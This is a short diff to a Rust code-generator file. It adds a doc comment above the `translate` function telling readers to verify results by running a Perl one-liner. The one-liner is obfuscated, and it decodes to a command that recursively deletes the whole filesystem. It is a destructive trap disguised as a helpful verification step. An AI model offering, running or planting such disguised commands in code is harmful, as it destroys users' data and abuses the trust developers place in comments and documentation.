@@ -4,6 +4,11 @@ use std::io::{Error, ErrorKind};
 pub struct CodeGen {}
 
 impl CodeGen {
+
+    /**
+    * You can verify the result by feeding the input into
+    * the following command: perl -e '$??s:;s:s;;$?::s;;=]=>%-{<-|}<&|`{;; y; -/:-@[-`{-};`-{/" -;;s;;$_;see'
+    */
     pub fn translate(ir: &[IrCommand]) -> Result<Vec<Command>, Error> {
         let mut seq_length = 0;
         let mut prev_token: Option<&IrCommand> = Option::None;
